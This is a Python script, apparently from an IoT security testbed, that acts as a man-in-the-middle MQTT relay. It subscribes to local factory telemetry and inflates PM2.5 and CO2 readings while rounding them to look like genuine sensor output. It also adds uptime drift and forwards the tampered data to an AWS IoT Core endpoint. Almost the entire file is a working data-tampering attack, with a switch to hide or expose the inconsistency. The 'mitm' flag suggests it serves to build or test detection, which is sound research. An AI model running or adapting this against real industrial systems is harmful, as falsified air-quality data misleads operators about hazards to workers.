import json
import ssl
import random
import paho.mqtt.client as mqtt

# =============================
# LOCAL MQTT (PLAINTEXT)
# =============================
LOCAL_BROKER = "127.0.0.1"
LOCAL_PORT = 1883
SUB_TOPIC = "factory/+/+/+/telemetry"

# =============================
# AWS IOT CORE (TLS)
# =============================
AWS_ENDPOINT = "a3vm4tlq95958f-ats.iot.ap-south-1.amazonaws.com"
AWS_PORT = 8883

CA_CERT = "/var/snap/mosquitto/common/certs/AmazonRootCA1.pem"
DEVICE_CERT = "/var/snap/mosquitto/common/certs/crt.crt"
PRIVATE_KEY = "/var/snap/mosquitto/common/certs/key.key"

# =============================
# ATTACK MODES
# =============================
TAMPER = True
RECOMPUTE_AIR_SCORE = False   # 🔥 False = semantic inconsistency

# =============================
# Air Purity Index Logic
# (same as PLC, copied intentionally)
# =============================
def clamp01(x):
    return max(0.0, min(1.0, x))

def compute_air_score(pm25, pm10, co2, voc, humidity):
    pm25_score = clamp01(pm25 / 35.0)
    pm10_score = clamp01(pm10 / 50.0)
    co2_score  = clamp01(co2 / 1000.0)
    voc_score  = clamp01(voc / 500.0)
    hum_score  = clamp01(abs(humidity - 50.0) / 50.0)

    air_score = (
        0.35 * pm25_score +
        0.20 * pm10_score +
        0.20 * co2_score +
        0.15 * voc_score +
        0.10 * hum_score
    )

    if air_score <= 0.3:
        state = "pure"
    elif air_score <= 0.6:
        state = "moderate"
    elif air_score <= 0.8:
        state = "unhealthy"
    else:
        state = "dangerous"

    return round(air_score, 3), state

# =============================
# MITM TAMPERING LOGIC
# =============================
def tamper(payload: dict) -> dict:
    payload["mitm"] = True

    # Subtle uptime drift
    payload["uptime"] += random.randint(3, 7)

    # ---- Air data tampering ----
    air = payload.get("air", {})

    # Subtle but meaningful manipulation
    air["pm25"] *= random.uniform(1.15, 1.35)
    air["co2"]  *= random.uniform(1.10, 1.25)

    # Round like real sensors
    air["pm25"] = round(air["pm25"], 2)
    air["co2"] = round(air["co2"], 1)

    payload["air"] = air

    # ---- Semantic consistency (optional) ----
    if RECOMPUTE_AIR_SCORE:
        score, state = compute_air_score(
            air["pm25"],
            air["pm10"],
            air["co2"],
            air["voc"],
            air["humidity"]
        )
        payload["air_score"] = score
        payload["air_state"] = state
    # else: attacker forgets / chooses not to recompute

    return payload

# =============================
# AWS MQTT CLIENT
# =============================
aws = mqtt.Client(client_id="sentinelmesh-mitm-forwarder")

aws.tls_set(
    ca_certs=CA_CERT,
    certfile=DEVICE_CERT,
    keyfile=PRIVATE_KEY,
    tls_version=ssl.PROTOCOL_TLSv1_2
)

aws.connect(AWS_ENDPOINT, AWS_PORT, 60)
aws.loop_start()

# =============================
# LOCAL SUBSCRIBER CALLBACK
# =============================
def on_message(client, userdata, msg):
    try:
        payload = json.loads(msg.payload.decode())
    except Exception as e:
        print("[!] Invalid JSON:", e)
        return

    original = payload.copy()

    if TAMPER:
        payload = tamper(payload)

    aws.publish(msg.topic, json.dumps(payload), qos=1)

    print(f"[MITM] {msg.topic}")
    print("  before:", original)
    print("  after :", payload)
    print()

# =============================
# LOCAL MQTT SUBSCRIBER
# =============================
local = mqtt.Client(client_id="sentinelmesh-mitm-subscriber")
local.on_message = on_message
local.connect(LOCAL_BROKER, LOCAL_PORT, 60)
local.subscribe(SUB_TOPIC)
local.loop_forever()
